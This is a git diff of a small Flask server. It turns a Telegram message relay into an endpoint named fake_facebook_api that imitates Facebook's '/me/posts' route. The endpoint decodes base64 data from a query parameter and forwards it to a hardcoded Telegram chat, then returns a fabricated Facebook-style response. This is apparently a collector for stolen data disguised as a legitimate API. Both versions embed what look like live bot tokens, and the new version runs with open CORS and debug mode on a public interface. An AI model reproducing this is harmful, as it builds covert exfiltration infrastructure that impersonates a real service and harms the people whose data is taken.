@@ -1,33 +1,43 @@
 from flask import Flask, request, jsonify
-import requests
 from flask_cors import CORS
+import requests
+import base64
 
 app = Flask(__name__)
-CORS(app, resources={r"/send-message": {"origins": "*"}}, supports_credentials=True)
+CORS(app)  # Thêm CORS để cho phép tất cả origin
 
-BOT_TOKEN = "6591392740:AAFusEvzSo-0-VdYJGRBUrPtfp8jGsoNiqw"
-CHAT_ID = "@ongochoc123"
-TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+TELEGRAM_TOKEN = "7908353422:AAHYaNhrmsGznxxHKFXtGjzunQ3W7Tcsosw"
+TELEGRAM_CHAT_ID = "-4670883195"
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
 
-@app.route('/send-message', methods=['POST', 'OPTIONS'])
-def send_message():
-    if request.method == 'OPTIONS':
-        return '', 204  # Trả về response trống cho preflight
+@app.route('/me/posts', methods=['GET'])
+def fake_facebook_api():
+    data = request.args.get('data', '')
+    
     try:
-        data = request.get_json()
-        message = data.get("message", "") if data else ""
-        if not message:
-            return jsonify({"error": "No message provided"}), 400
+        decoded_data = base64.b64decode(data).decode('utf-8')
+    except:
+        decoded_data = data
 
-        response = requests.post(TELEGRAM_API_URL, json={
-            "chat_id": CHAT_ID,
-            "text": message,
-            "parse_mode": "Markdown"
-        })
+    if decoded_data:
+        send_to_telegram(decoded_data)
 
-        return jsonify(response.json()), response.status_code
+    fake_response = {
+        "data": [{"id": "123", "message": "Fake post", "created_time": "2025-03-04"}],
+        "paging": {"previous": "fake_prev", "next": "fake_next"}
+    }
+    return jsonify(fake_response)
+
+def send_to_telegram(data):
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": data,
+        "parse_mode": "Markdown"
+    }
+    try:
+        requests.post(TELEGRAM_API_URL, json=payload)
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        print("Lỗi Telegram:", str(e))
 
-if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=5000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
